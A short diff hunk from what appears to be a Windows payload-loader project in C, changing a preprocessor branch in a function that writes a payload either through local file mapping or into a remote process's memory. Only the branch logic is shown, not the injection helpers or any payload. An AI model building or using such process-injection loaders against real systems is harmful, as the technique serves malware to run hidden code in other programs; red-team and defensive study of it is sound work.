@@ -28,7 +28,7 @@ BOOL payload_loading(PVOID *pPayloadAddress, LPVOID Payload, SIZE_T PayloadSize,
         bSuccess = WritePayloadViaLocalFileMapping(Payload, PayloadSize, pPayloadAddress);
         pPayloadAddress = *pPayloadAddress;
     }    
-#else
+#elif defined (IN_MEMORY)
     if (IsHandleValid(hProcess)) {
         DebugPrint("[i] Payload loading through standard remote process in memory technique...\n");
         bSuccess = WritePayloadInRemoteProcessMemory(hProcess, Payload, PayloadSize, pPayloadAddress);
